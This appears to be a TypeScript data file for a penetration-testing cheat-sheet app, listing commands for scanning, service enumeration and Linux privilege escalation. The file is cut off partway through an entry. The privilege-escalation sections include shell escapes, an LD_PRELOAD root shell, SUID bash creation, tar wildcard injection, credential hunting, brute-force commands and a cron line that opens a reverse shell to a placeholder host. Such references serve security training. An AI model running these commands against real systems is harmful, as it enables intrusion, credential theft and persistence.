
export interface Command {
  title: string;
  command: string;
  description?: string;
}

export interface SubCategory {
  [key: string]: Command[];
}

export interface Category {
  [key: string]: SubCategory;
}

export const commandData: Category = {
  "Scanning": {
"Nmap": [
  {
    title: "Basic TCP SYN Scan",
    command: "nmap -sS -Pn <IP>"
  },
  {
    title: "Service & Version Detection",
    command: "nmap -sV -sC -Pn -T4 <IP>"
  },
  {
    title: "Aggressive Scan",
    command: "nmap -A <IP>"
  },
  {
    title: "Full TCP Port Scan",
    command: "nmap -p- -T4 <IP>"
  },
  {
    title: "Top 100 Ports Scan",
    command: "nmap --top-ports 100 <IP>"
  },
  {
    title: "UDP Scan (Top Ports)",
    command: "nmap -sU --top-ports 50 <IP>"
  },
  {
    title: "Scan Specific Ports",
    command: "nmap -p 21,22,80,443 <IP>"
  },
  {
    title: "Scan Multiple IPs",
    command: "nmap <IP1> <IP2> <IP3>"
  },
  {
    title: "Output to all formats",
    command: "nmap -sC -sV -oA scan <IP>"
  },
  {
    title: "Scan Subnet",
    command: "nmap -sP <SUBNET>/24"
  },
  {
    title: "Disable DNS Resolution",
    command: "nmap -n <IP>"
  },
  {
    title: "Detect Firewall Rules",
    command: "nmap -sA <IP>"
  },
  {
    title: "Check for Vulnerabilities (Scripts)",
    command: "nmap --script vuln <IP>"
  },
  {
    title: "Check for SMB Vulnerabilities",
    command: "nmap -p445 --script=smb-vuln* <IP>"
  }
],
"Masscan": [
  {
    title: "Fast Full TCP Port Scan",
    command: "masscan <IP> -p1-65535 --rate 1000"
  },
  {
    title: "Top 1000 TCP Ports",
    command: "masscan <IP> -p0-1000 --rate 5000"
  },
  {
    title: "Scan Multiple IPs/Subnets",
    command: "masscan 10.10.0.0/16 -p1-1000 --rate 10000"
  },
  {
    title: "Output to Grepable File",
    command: "masscan <IP> -p1-65535 --rate 2000 -oG ports.txt"
  },
  {
    title: "Scan Specific Ports",
    command: "masscan <IP> -p22,80,443 --rate 1000"
  },
  {
    title: "Exclude Hosts from Scan",
    command: "masscan <IP> -p1-1000 --excludefile exclude.txt"
  },
  {
    title: "Output XML for Nmap Import",
    command: "masscan <IP> -p1-65535 -oX masscan.xml"
  },
  {
    title: "Scan Using a List of IPs",
    command: "masscan -iL targets.txt -p22,80,443 --rate 3000"
  }
],
"Banner Grabbing": [
  {
    title: "Netcat - Manual Banner Grab",
    command: "nc -nv <IP> <PORT>"
  },
  {
    title: "Telnet - Manual Banner Grab",
    command: "telnet <IP> <PORT>"
  },
  {
    title: "Nmap - Banner Grabbing Script",
    command: "nmap -sV --script=banner -p <PORTS> <IP>"
  },
  {
    title: "Nmap - Full Version Detection",
    command: "nmap -sV -p <PORTS> <IP>"
  },
  {
    title: "cURL - HTTP Headers / Banner",
    command: "curl -I http://<IP>"
  },
  {
    title: "OpenSSL - Grab SSL/TLS Banner",
    command: "openssl s_client -connect <IP>:443"
  },
  {
    title: "FTP Banner Grab",
    command: "echo | nc <IP> 21"
  },
  {
    title: "SMTP Banner Grab",
    command: "echo | nc <IP> 25"
  },
  {
    title: "Grab HTTP Headers (Custom User-Agent)",
    command: "curl -I -A 'Mozilla' http://<IP>"
  },
  {
    title: "Bash Loop - Grab Banners from Multiple Ports",
    command: "for port in 21 22 23 25 80 110 143 443; do echo \"\\n\" | nc -nv <IP> $port; done"
  }
],
"Wfuzz & Ffuf": [
  {
    title: "🌀 WFuzz - Basic Directory Fuzzing",
    command: "wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://<IP>/FUZZ"
  },
  {
    title: "🌀 WFuzz - Fuzz GET Parameter Values",
    command: "wfuzz -c -w wordlist.txt --hc 404 http://<IP>/page.php?id=FUZZ"
  },
  {
    title: "🌀 WFuzz - Fuzz Headers (User-Agent)",
    command: "wfuzz -c -w wordlist.txt -H 'User-Agent: FUZZ' http://<IP>"
  },
  {
    title: "🌀 WFuzz - POST Data Parameter Fuzzing",
    command: "wfuzz -c -w wordlist.txt -d 'username=admin&password=FUZZ' --hc 403 http://<IP>/login.php"
  },
  {
    title: "⚡ FFUF - Directory Bruteforce",
    command: "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ -mc all"
  },
  {
    title: "⚡ FFUF - Subdomain Bruteforce",
    command: "ffuf -w subdomains.txt -u http://FUZZ.<DOMAIN> -H 'Host: FUZZ.<DOMAIN>' -fs 4242"
  },
  {
    title: "⚡ FFUF - GET Parameter Fuzzing",
    command: "ffuf -u http://<IP>/page.php?search=FUZZ -w payloads.txt"
  },
  {
    title: "⚡ FFUF - Fuzzing Headers",
    command: "ffuf -u http://<IP>/ -H 'X-Custom-Header: FUZZ' -w wordlist.txt"
  },
  {
    title: "⚡ FFUF - POST Parameter Fuzzing",
    command: "ffuf -w wordlist.txt -u http://<IP>/login -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'"
  },
  {
    title: "⚡ FFUF - Match by Response Length",
    command: "ffuf -w wordlist.txt -u http://<IP>/FUZZ -ml 1234"
  }
],
"nikto": [
  {
    title: "Basic Web Scan",
    command: "nikto -h http://<IP>"
  },
  {
    title: "HTTPS Scan",
    command: "nikto -h https://<IP>"
  },
  {
    title: "Scan with Specific Port",
    command: "nikto -h http://<IP> -p <PORT>"
  },
  {
    title: "Scan Virtual Host",
    command: "nikto -h <DOMAIN> -vhost <DOMAIN>"
  },
  {
    title: "Save Results to Text File",
    command: "nikto -h http://<IP> -output result.txt"
  },
  {
    title: "Save Results to HTML",
    command: "nikto -h http://<IP> -Format html -output report.html"
  },
  {
    title: "Scan with Specific User-Agent",
    command: "nikto -h http://<IP> -useragent 'Mozilla/5.0 (X11; Linux x86_64)'"
  },
  {
    title: "Scan Using Custom Cookies",
    command: "nikto -h http://<IP> -Cgidirs all -id 'admin:admin'"
  },
  {
    title: "Aggressive Scan (All Checks)",
    command: "nikto -h http://<IP> -Tuning 1234567890"
  },
  {
    title: "Proxy Scan Through Burp",
    command: "nikto -h http://<IP> -useproxy http://127.0.0.1:8080"
  }
]
,
"dirb": [
  {
    title: "Basic Directory Bruteforce",
    command: "dirb http://<IP>"
  },
  {
    title: "Specify Custom Wordlist",
    command: "dirb http://<IP> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
  },
  {
    title: "Bruteforce HTTPS Site",
    command: "dirb https://<IP>"
  },
  {
    title: "Scan with Extensions",
    command: "dirb http://<IP> -X .php,.html,.txt"
  },
  {
    title: "Scan Specific Port",
    command: "dirb http://<IP>:<PORT>"
  },
  {
    title: "Output to File",
    command: "dirb http://<IP> -o dirb_results.txt"
  },
  {
    title: "Recursive Scan (Experimental)",
    command: "dirb http://<IP> /path/to/wordlist -r"
  },
  {
    title: "Ignore 403 Forbidden",
    command: "dirb http://<IP> /path/to/wordlist -N 403"
  },
  {
    title: "Scan with Proxy (e.g., Burp)",
    command: "dirb http://<IP> -p http://127.0.0.1:8080"
  }
]
,
"gobuster": [
  {
    title: "Directory Bruteforce (Basic)",
    command: "gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt"
  },
  {
    title: "Directory Bruteforce with File Extensions",
    command: "gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html"
  },
  {
    title: "Directory Bruteforce over HTTPS",
    command: "gobuster dir -u https://<IP> -w /usr/share/wordlists/dirb/common.txt"
  },
  {
    title: "Scan with Custom Status Code Filtering",
    command: "gobuster dir -u http://<IP> -w wordlist.txt -s 200,204,301,302,307,403"
  },
  {
    title: "Subdomain Bruteforce",
    command: "gobuster dns -d <DOMAIN> -w /usr/share/wordlists/dns/namelist.txt"
  },
  {
    title: "Virtual Host Discovery",
    command: "gobuster vhost -u http://<IP> -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt"
  },
  {
    title: "Output to File",
    command: "gobuster dir -u http://<IP> -w wordlist.txt -o gobuster_results.txt"
  },
  {
    title: "Increase Threads for Speed",
    command: "gobuster dir -u http://<IP> -w wordlist.txt -t 50"
  },
  {
    title: "Use Proxy (e.g. Burp)",
    command: "gobuster dir -u http://<IP> -w wordlist.txt -p http://127.0.0.1:8080"
  },
  {
    title: "Force Recursive Scan",
    command: "gobuster dir -u http://<IP> -w wordlist.txt -r"
  }
]
,
"CMS": [
  {
    title: "Identify CMS with WhatWeb",
    command: "whatweb http://<IP>"
  },
  {
    title: "Identify CMS with Wappalyzer (CLI)",
    command: "wappalyzer http://<IP>"
  },
  {
    title: "CMS Detection with BuiltWith",
    command: "builtwith https://<IP>"
  },
  {
    title: "CMSmap (Scan WordPress, Joomla, Drupal)",
    command: "cmsmap http://<IP>"
  },
  {
    title: "WPScan - WordPress Scan (Enumerate Users, Plugins, Themes)",
    command: "wpscan --url http://<IP> --enumerate u,p,t"
  },
  {
    title: "WPScan with API Token (for full plugin data)",
    command: "wpscan --url http://<IP> --api-token YOUR_TOKEN"
  },
  {
    title: "WPScan – Brute Force User Login",
    command: "wpscan --url http://<IP> -U users.txt -P /usr/share/wordlists/rockyou.txt"
  },
  {
    title: "JoomScan - Joomla Scanner",
    command: "joomscan -u http://<IP>"
  },
  {
    title: "Droopescan - Scan Drupal, Silverstripe, etc.",
    command: "droopescan scan drupal -u http://<IP>"
  },
  {
    title: "Searchsploit WordPress Plugins",
    command: "searchsploit wordpress plugin"
  },
  {
    title: "Searchsploit Joomla Exploits",
    command: "searchsploit joomla"
  },
  {
    title: "Drupalgeddon Exploit Check (Manual)",
    command: "curl -i -s -k -X 'POST' --data 'name[0]=bob&name[1]=array&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in' http://<IP>/?q=node&destination=node"
  }
]




  },

  "Enumeration": {
  
"SMB": [
  {
    title: "Enum4linux Basic Enumeration",
    command: "enum4linux -a <IP>"
  },
  {
    title: "smbclient Anonymous Login",
    command: "smbclient -L //<IP>/ -N"
  },
  {
    title: "smbclient Connect to Share",
    command: "smbclient //<IP>/<SHARE> -N"
  },
  {
    title: "smbmap List Shares (Anonymous)",
    command: "smbmap -H <IP>"
  },
  {
    title: "smbmap List Shares (With Creds)",
    command: "smbmap -H <IP> -u <USER> -p <PASS>"
  },
  {
    title: "List SMB Shares using Nmap",
    command: "nmap -p 139,445 --script smb-enum-shares.nse,smb-enum-users.nse <IP>"
  },
  {
    title: "Check for SMB Vulns (MS17-010)",
    command: "nmap -p445 --script smb-vuln-ms17-010 <IP>"
  },
  {
    title: "CrackMapExec SMB Enumeration",
    command: "cme smb <IP> --shares"
  },
  {
    title: "Access SMB Share with creds",
    command: "smbclient //<IP>/<SHARE> -U <USER>"
  },
  {
    title: "Mount SMB Share (Linux)",
    command: "sudo mount -t cifs //<IP>/<SHARE> /mnt/smb -o user=<USER>"
  }
],
"NetBIOS": [
  {
    title: "nbtscan - Scan for NetBIOS names",
    command: "nbtscan <IP>"
  },
  {
    title: "nbtscan - Subnet Scan",
    command: "nbtscan <SUBNET>/24"
  },
  {
    title: "nmblookup - NetBIOS Name Query",
    command: "nmblookup -A <IP>"
  },
  {
    title: "NetBIOS Scan with Nmap",
    command: "nmap -p 137 --script nbstat.nse <IP>"
  },
  {
    title: "NetBIOS Host Discovery",
    command: "nmap -sU -p137 --script nbstat <IP>"
  }
],
"SNMP": [
  {
    title: "SNMPWalk - Public Community String",
    command: "snmpwalk -v2c -c public <IP>"
  },
  {
    title: "SNMPWalk - System Info",
    command: "snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1"
  },
  {
    title: "SNMPCheck - Enumerate with snmp-check",
    command: "snmp-check <IP>"
  },
  {
    title: "SNMP Enumeration with Onesixtyone",
    command: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <IP>"
  },
  {
    title: "Nmap SNMP Script Scan",
    command: "nmap -sU -p 161 --script snmp* <IP>"
  },
  {
    title: "SNMPWalk with Custom OID",
    command: "snmpwalk -v2c -c public <IP> <OID>"
  },
  {
    title: "SNMPWalk - List Running Processes",
    command: "snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2"
  },
  {
    title: "SNMPWalk - Network Interfaces",
    command: "snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.2.2.1.2"
  }
]
,
"LDAP": [
  {
    title: "ldapsearch - Anonymous Bind (Basic Info)",
    command: "ldapsearch -x -H ldap://<IP> -s base"
  },
  {
    title: "ldapsearch - Enumerate Directory Info",
    command: "ldapsearch -x -H ldap://<IP> -b 'dc=example,dc=com'"
  },
  {
    title: "ldapsearch - List Users (Typical AD)",
    command: "ldapsearch -x -H ldap://<IP> -b 'dc=example,dc=com' '(objectClass=user)' sAMAccountName"
  },
  {
    title: "ldapsearch - Search for Domain Admins",
    command: "ldapsearch -x -H ldap://<IP> -b 'dc=example,dc=com' '(&(objectClass=group)(cn=*Admin*))'"
  },
  {
    title: "Nmap LDAP Scripts",
    command: "nmap -p 389 --script ldap-search <IP>"
  },
  {
    title: "ldapdomaindump (Authenticated)",
    command: "ldapdomaindump ldap://<IP> -u '<DOMAIN>\\<USER>' -p '<PASS>'"
  },
  {
    title: "CrackMapExec LDAP Enumeration",
    command: "cme ldap <IP> -u '' -p '' --users"
  }
]
,
"SMTP": [
  {
    title: "Nmap SMTP Script Scan",
    command: "nmap -p 25,465,587 --script smtp-enum-users <IP>"
  },
  {
    title: "SMTP VRFY Command (Manual)",
    command: "telnet <IP> 25\nVRFY root"
  },
  {
    title: "SMTP EXPN Command (Manual)",
    command: "telnet <IP> 25\nEXPN admin"
  },
  {
    title: "SMTP User Enumeration with metasploit",
    command: "msfconsole\nuse auxiliary/scanner/smtp/smtp_enum\nset RHOSTS <IP>\nset USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt\nrun"
  },
  {
    title: "SMTP Connect & Grab Banner (Netcat)",
    command: "nc <IP> 25"
  },
  {
    title: "SMTP Enumeration with swaks (manual test email)",
    command: "swaks --to test@example.com --from spoof@example.com --server <IP>"
  }
]
,
"FTP": [
  {
    title: "Check for Anonymous Login",
    command: "ftp <IP>\nName: anonymous\nPassword: anonymous"
  },
  {
    title: "Connect to FTP with Credentials",
    command: "ftp <IP>\nName: <USER>\nPassword: <PASS>"
  },
  {
    title: "List Files via Command Line (Linux)",
    command: "ftp <IP>\nls -la"
  },
  {
    title: "Download Files via Command Line FTP",
    command: "ftp <IP>\nget <FILENAME>"
  },
  {
    title: "Nmap FTP Scripts (Vuln & Enum)",
    command: "nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor <IP>"
  },
  {
    title: "Banner Grabbing via Netcat",
    command: "nc <IP> 21"
  },
  {
    title: "FTP Brute Force (hydra)",
    command: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<IP>"
  },
  {
    title: "Check FTP Server Version",
    command: "nmap -sV -p 21 <IP>"
  },
  {
    title: "Mirror Entire FTP Site with wget",
    command: "wget -m ftp://anonymous:anonymous@<IP>"
  },
  {
    title: "Download FTP File (Unauthenticated)",
    command: "curl ftp://<IP>/<FILE> -o <OUTPUT>"
  }
]
,
"SSH": [
  {
    title: "Check SSH Version (Banner Grab)",
    command: "nc <IP> 22"
  },
  {
    title: "Nmap SSH Script Scan",
    command: "nmap -p 22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods <IP>"
  },
  {
    title: "Hydra SSH Brute Force (Single User)",
    command: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<IP>"
  },
  {
    title: "Hydra SSH Brute Force (User List)",
    command: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP>"
  },
  {
    title: "CrackMapExec - Check SSH Access",
    command: "cme ssh <IP> -u <USER> -p <PASS>"
  },
  {
    title: "Connect to SSH (Basic)",
    command: "ssh <USER>@<IP>"
  },
  {
    title: "Connect with Identity File (Private Key)",
    command: "ssh -i id_rsa <USER>@<IP>"
  },
  {
    title: "Enumerate SSH Host Key Fingerprints",
    command: "ssh-keyscan <IP>"
  },
  {
    title: "SSH Local Port Forwarding",
    command: "ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<IP>"
  },
  {
    title: "SSH Reverse Tunnel (Remote Port Forward)",
    command: "ssh -R <REMOTE_PORT>:localhost:<LOCAL_PORT> <USER>@<IP>"
  }
]
,
"DNS": [
  {
    title: "Dig for A Record",
    command: "dig @<DNS_SERVER> <TARGET_DOMAIN> A"
  },
  {
    title: "Dig for All Records",
    command: "dig @<DNS_SERVER> <TARGET_DOMAIN> ANY"
  },
  {
    title: "DNS Zone Transfer (AXFR)",
    command: "dig AXFR <TARGET_DOMAIN> @<DNS_SERVER>"
  },
  {
    title: "DNS Recon using dnsrecon",
    command: "dnsrecon -d <TARGET_DOMAIN> -t std"
  },
  {
    title: "Bruteforce Subdomains with dnsenum",
    command: "dnsenum <TARGET_DOMAIN>"
  },
  {
    title: "Fierce - DNS Recon & Subdomain Enum",
    command: "fierce -dns <TARGET_DOMAIN>"
  },
  {
    title: "dnsmap - Subdomain Brute Force",
    command: "dnsmap <TARGET_DOMAIN>"
  },
  {
    title: "Host Command for DNS Lookup",
    command: "host -t A <TARGET_DOMAIN>"
  },
  {
    title: "Reverse Lookup with host",
    command: "host <IP>"
  },
  {
    title: "Nmap DNS Brute",
    command: "nmap --script dns-brute -sn <IP>"
  },
  {
    title: "List Domain's Name Servers",
    command: "dig ns <TARGET_DOMAIN>"
  },
  {
    title: "List Mail Servers (MX Records)",
    command: "dig mx <TARGET_DOMAIN>"
  }
]

,
    "Web": [
      {
        title: "Gobuster Dirs",
        command: "gobuster dir -u http://<IP>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html",
        description: "Directory and file enumeration"
      },
      {
        title: "Nikto",
        command: "nikto -h <IP> -p <PORT>",
        description: "Web server vulnerability scanner"
      }
    ]
  },
  "Linux Privilege Escalation": {
    "Manual Enumeration": [
  {
    title: "Check Kernel Version",
    command: "uname -a"
  },
  {
    title: "List OS Info",
    command: "cat /etc/issue"
  },
  {
    title: "Check Compiler Availability",
    command: "cat /proc/version"
  },
  {
    title: "List All Users",
    command: "cat /etc/passwd"
  },
  {
    title: "List Groups",
    command: "cat /etc/group"
  },
  {
    title: "Current User Info",
    command: "id"
  },
  {
    title: "Check Permissions of Files",
    command: "ls -la"
  },
  {
    title: "List Running Processes (Detailed)",
    command: "ps -aux"
  },
  {
    title: "Show Process Tree",
    command: "ps axjf"
  },
  {
    title: "List All Listening Services (netstat)",
    command: "netstat -ano"
  },
  {
    title: "List Listening Services (ss)",
    command: "ss -anp"
  },
  {
    title: "Find World Writable Files",
    command: "find / -perm -2 -type f 2>/dev/null"
  }
]
,
"Automated Enum Tools": [
  {
    title: "Run LinPEAS (Priv Esc Auto Script)",
    command: "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh"
  },
  {
    title: "Run LinEnum (Manual Checks)",
    command: "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh"
  },
  {
    title: "Unix Privesc Check",
    command: "wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check -O upc.pl && chmod +x upc.pl && ./upc.pl"
  },
  {
    title: "Linux Exploit Suggester (LEGACY)",
    command: "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh && chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh"
  },
  {
    title: "Linux Exploit Suggester 2 (LES2)",
    command: "wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl && perl linux-exploit-suggester-2.pl"
  },
  {
    title: "Run pspy (monitor processes without root)",
    command: "wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 && chmod +x pspy64 && ./pspy64"
  },
  {
    title: "GTFOBins for Sudo/SUID Commands",
    command: "https://gtfobins.github.io/"
  }
]
,
"Sensitive Credentials": [
  {
    title: "Check Bash History",
    command: "cat ~/.bash_history"
  },
  {
    title: "Check History File Used",
    command: "echo $HISTFILE"
  },
  {
    title: "Check All User Histories",
    command: "cat ~/.*history | less"
  },
  {
    title: "Find Config Files with Passwords",
    command: "find / -type f -exec grep -i -l 'password\\|passwd' {} /dev/null \\; 2>/dev/null"
  },
  {
    title: "Locate Sensitive Files (config.php, password)",
    command: "locate config.php && locate password && locate passwd"
  },
  {
    title: "Search for Passwords Recursively",
    command: "grep -rnw '/' -ie 'password\\|passwd' --color=always 2>/dev/null"
  },
  {
    title: "Check for Emails (May Have Creds)",
    command: "cat /var/mail/* && cat /var/spool/mail/*"
  },
  {
    title: "Check Recently Modified Files",
    command: "find / -mmin -10 -xdev 2>/dev/null"
  },
  {
    title: "Find Private SSH Keys",
    command: "find / -name 'id_rsa' 2>/dev/null"
  },
  {
    title: "Check SSH Folder for Keys",
    command: "ls -la ~/.ssh/"
  },
  {
    title: "SSH with Private Key",
    command: "ssh -i id_rsa root@<IP>"
  },
  {
    title: "Strings from Running Process Binary",
    command: "strings /proc/<PID>/exe | less"
  },
  {
    title: "Dump Memory for Passwords (if /dev/mem available)",
    command: "strings /dev/mem -n10 | grep -ie 'password\\|passwd'"
  },
  {
    title: "Extract Creds from Process with GDB",
    command: "gdb -p <PID>\ninfo proc mappings\ndump memory /tmp/dump <start> <end>"
  },
  {
    title: "Extract Browser Stored Passwords using LaZagne",
    command: "python3 lazagne.py all"
  }
]
,
"SUDO": [
  {
    title: "Check SUDO Permissions",
    command: "sudo -l"
  },
  {
    title: "Spawn Shell Using Python",
    command: "sudo python -c 'import pty; pty.spawn(\"/bin/bash\")'"
  },
  {
    title: "Spawn Shell Using Python3",
    command: "sudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
  },
  {
    title: "GTFOBins for SUDO Exploits",
    command: "https://gtfobins.github.io/"
  },
  {
    title: "Check SUDO Vulnerable Binaries",
    command: "ls -la /usr/bin/ | grep -E 'nmap|perl|ruby|vi|less|more|gdb|python'"
  },
  {
    title: "Run Nmap Interactive Shell (If SUDO Permitted)",
    command: "sudo nmap --interactive\nnmap> !sh"
  },
  {
    title: "SUDO Escape via VI",
    command: "sudo vi\n:!bash"
  },
  {
    title: "SUDO Escape via Less",
    command: "sudo less /etc/hosts\n!bash"
  },
  {
    title: "SUDO Escape via Man",
    command: "sudo man man\n!bash"
  },
  {
    title: "Escape Using LD_PRELOAD",
    command: "echo 'void _init() { setuid(0); system(\"/bin/bash\"); }' > shell.c\n" +
             "gcc -fPIC -shared -o shell.so shell.c -nostartfiles\n" +
             "sudo LD_PRELOAD=./shell.so <target_binary>"
  },
  {
    title: "Escape Using LD_LIBRARY_PATH",
    command: "gcc -fPIC -shared -o libhack.so -nostartfiles hack.c\n" +
             "sudo LD_LIBRARY_PATH=. <target_binary>"
  }
]
,
"SUID/SGID": [
  {
    title: "Find All SUID Binaries (Basic)",
    command: "find / -perm -4000 -type f 2>/dev/null"
  },
  {
    title: "Find All SUID Binaries (Owned by Root)",
    command: "find / -user root -perm -4000 -print 2>/dev/null"
  },
  {
    title: "Find All SGID Binaries",
    command: "find / -perm -2000 -type f 2>/dev/null"
  },
  {
    title: "Find All Binaries with SUID Bit Set (Comprehensive)",
    command: "find / -perm -u=s -type f 2>/dev/null"
  },
  {
    title: "Find All Binaries with SGID Bit Set (Comprehensive)",
    command: "find / -perm -g=s -type f 2>/dev/null"
  },
  {
    title: "Check Specific Binary for SUID Bit",
    command: "ls -la /usr/local/bin/<binary>"
  },
  {
    title: "Use GTFOBins for Exploit Reference",
    command: "https://gtfobins.github.io/"
  },
  {
    title: "Run Nmap with SUID Bit Set",
    command: "/usr/bin/nmap --interactive\nnmap> !sh"
  },
  {
    title: "Exploit Bash with SUID Bit Set",
    command: "/bin/bash -p"
  },
  {
    title: "Run Perl Shell with SUID Bit",
    command: "perl -e 'exec \"/bin/sh\";'"
  },
  {
    title: "Run Find to Escalate Privileges",
    command: "find . -exec /bin/sh \\; -quit"
  },
  {
    title: "Create SUID Shell Binary",
    command: "cp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash\n/tmp/rootbash -p"
  }
]
,
"Kernel Exploits": [
  {
    title: "Check Kernel Version",
    command: "uname -a"
  },
  {
    title: "Get Linux Version via /proc/version",
    command: "cat /proc/version"
  },
  {
    title: "Get OS Information",
    command: "cat /etc/issue"
  },
  {
    title: "Search for Kernel Exploits Using Searchsploit",
    command: "searchsploit linux kernel <version>"
  },
  {
    title: "Check Compiler Availability",
    command: "which gcc || which cc"
  },
  {
    title: "Check for Dirty COW Vulnerability (CVE-2016-5195)",
    command: "https://github.com/firefart/dirtycow"
  },
  {
    title: "Compile Dirty COW Exploit",
    command: "gcc -pthread dirty.c -o dirty -lcrypt"
  },
  {
    title: "Run Dirty COW Exploit (Creates User)",
    command: "./dirty"
  },
  {
    title: "Post-Exploitation: Check New User",
    command: "su <created_user>"
  },
  {
    title: "Linux Exploit Suggester 2",
    command: "https://github.com/jondonas/linux-exploit-suggester-2\nperl linux-exploit-suggester-2.pl"
  },
  {
    title: "Linux Exploit Suggester",
    command: "https://github.com/mzet-/linux-exploit-suggester\nperl linux-exploit-suggester.pl"
  }
],

"Cron Jobs": [
  {
    title: "List Cron Jobs (System-Wide)",
    command: "ls -la /etc/cron*"
  },
  {
    title: "Check System-Wide Crontab File",
    command: "cat /etc/crontab"
  },
  {
    title: "Check User Crontab",
    command: "crontab -l"
  },
  {
    title: "Check World-Writable Files",
    command: "find / -perm -2 -type f 2>/dev/null"
  },
  {
    title: "Check Writable Scripts Used by Cron",
    command: "ls -la /usr/local/sbin/<cron_script>.sh"
  },
  {
    title: "Exploit: Inject Command in Writable Cron Script",
    command: "echo \"chmod +s /bin/bash\" > /usr/local/sbin/<cron_script>.sh"
  },
  {
    title: "Schedule Reverse Shell Payload via Cron",
    command: "echo '* * * * * bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /etc/crontab"
  },
  {
    title: "Check for cron.d/ Files",
    command: "ls -la /etc/cron.d/"
  },
  {
    title: "Check for Recently Modified Cron Files",
    command: "find /etc/ -type f -name '*cron*' -mmin -60"
  },
  {
    title: "Reference: Crontab Timing Cheatsheet",
    command: "https://crontab.guru/"
  }
]
,
"PATH Manipulation": [
  {
    title: "Check Current PATH Environment Variable",
    command: "echo $PATH"
  },
  {
    title: "Exploit: Create Fake Binary in Writable Directory",
    command: "echo -e '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/clean"
  },
  {
    title: "Make Fake Binary Executable",
    command: "chmod +x /tmp/clean"
  },
  {
    title: "Prepend Fake Binary Directory to PATH",
    command: "export PATH=/tmp:$PATH"
  },
  {
    title: "Trigger Vulnerable Command that Uses 'clean'",
    command: "cleanup.sh"
  },
  {
    title: "Find Scripts with Relative Path Executions",
    command: "grep -r 'clean' /etc/cron* 2>/dev/null"
  },
  {
    title: "List Writable Directories in PATH",
    command: "echo $PATH | tr ':' '\\n' | xargs -I{} find {} -writable -type d 2>/dev/null"
  },
  {
    title: "Find Binaries in PATH Being Called Without Full Path",
    command: "strings /usr/bin/<binary> | grep '/bin' | grep -v '/'"
  },
  {
    title: "Manual PATH Injection - Example",
    command: "export PATH=/home/user/malicious_bin:$PATH"
  },
  {
    title: "Verify If Custom PATH Is Applied",
    command: "which clean"
  }
]
,
"Wildcard Exploits": [
  {
    title: "Vulnerable Tar Wildcard Exploit (Privilege Escalation)",
    command: "echo 'chmod +s /bin/bash' > getroot.sh && chmod +x getroot.sh"
  },
  {
    title: "Prepare Archive File with Exploit Wildcards",
    command: "echo '' > '--checkpoint=1'\necho '' > '--checkpoint-action=exec=sh getroot.sh'"
  },
  {
    title: "Create Archive with Malicious Wildcards",
    command: "tar cf archive.tar *"
  },
  {
    title: "GTFOBins Reference (Wildcard Exploits)",
    command: "https://gtfobins.github.io/gtfobins/tar/"
  },
  {
    title: "Verify Exploitable Script Runs 'tar' Without Full Path",
    command: "cat /etc/crontab"
  },
  {
    title: "Manual Exploit Trigger (if needed)",
    command: "tar -cf backup.tar *"
  }
],

"Capabilities Exploits": [
  {
    title: "Enumerate All Files with Capabilities Set",
    command: "getcap -r / 2>/dev/null"
  },
  {
    title: "Find Capabilities on Python Binary",
    command: "getcap -r / 2>/dev/null | grep python"
  },
  {
    title: "Exploit Python Capability (cap_setuid)",
    command: "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
  },
  {
    title: "Find Capabilities on Perl Binary",
    command: "getcap -r / 2>/dev/null | grep perl"
  },
  {
    title: "Exploit Perl Capability (cap_setuid)",
    command: "/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
  },
  {
    title: "Check for Capabilities on Any Interesting Binaries",
    command: "getcap -r / 2>/dev/null | grep -E 'python|perl|bash|nmap|tcpdump|openssl'"
  },
  {
    title: "GTFOBins - Capabilities Section",
    command: "https://gtfobins.github.io/#+capabilities"
  }
]
,"Other Priv Esc Techniques": [
      {
        title: "Check for Docker group membership",
        command: "id && groups"
      },
      {
        title: "Check Docker socket access",
        command: "ls -la /var/run/docker.sock"
      },
      {
        title: "Spawn shell in Docker (if privileged)",
        command: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
      },
      {
        title: "List mounted NFS shares (check for root_squash)",
        command: "cat /etc/fstab && showmount -e <IP>"
      },
      {
        title: "Mount NFS share (read/write test)",
        command: "mount -t nfs <IP>:/share /mnt"
      },
      {
        title: "Check for user-defined systemd services",
        command: "systemctl list-timers --all"
      },
      {
        title: "Abuse writable systemd service file",
